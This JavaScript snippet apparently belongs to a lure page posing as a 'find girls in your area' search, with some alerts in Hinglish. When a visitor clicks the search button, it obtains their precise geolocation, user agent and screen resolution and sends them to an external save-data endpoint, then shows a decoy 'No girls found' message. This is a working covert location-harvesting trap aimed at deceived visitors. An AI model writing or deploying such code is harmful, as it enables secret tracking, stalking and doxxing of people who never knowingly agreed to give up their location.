document.getElementById('search-btn').addEventListener('click', () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    screenResolution: `${window.screen.width}x${window.screen.height}`
                };
                const data = { location, browserInfo };
                fetch('https://local1-7vns.onrender.com/save-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                    .then(response => {
                        if (response.ok) {
                            alert('No girls found in your area.');
                        } else {
                            console.error('Server error');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
            },
            error => {
                alert('Location access deny kiya gaya hai. Please browser settings mein allow karo.');
            }
        );
    } else {
        alert('Aapka browser location services support nahi karta.');
    }
});